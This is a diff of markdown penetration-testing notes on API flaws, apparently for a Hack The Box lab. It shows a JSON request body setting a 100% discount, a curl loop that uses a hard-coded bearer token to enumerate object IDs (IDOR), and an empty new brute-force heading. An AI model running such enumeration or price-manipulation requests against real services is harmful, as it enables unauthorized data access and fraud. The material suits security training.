@@ -51,7 +51,7 @@ Content-Length: 90
 {"chosen_discount":{"percentage":100},"chosen_products":[{"product_id":"1","quantity":1}]}
 ```
 
-# Broken Object Level Authorization
+# Broken Object Level Authorization (IDOR)
 ```bash
 for ((i=0;i<=20;i++))do 
 curl -s -w "\n" -X 'GET' \
@@ -59,4 +59,8 @@ curl -s -w "\n" -X 'GET' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTc2NDEyMjIxNSwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.QRSkAArHSb9OSeUaIwkkCcl-8pgkFKA25pV1m1EZXdYD1Fx6Zg5dtVR3tWD43CdWHm0giMcQT8DHzDjIQ01SRg
 done
+```
+# Broken Authentication (Brute Force)
+```bash
+
 ```
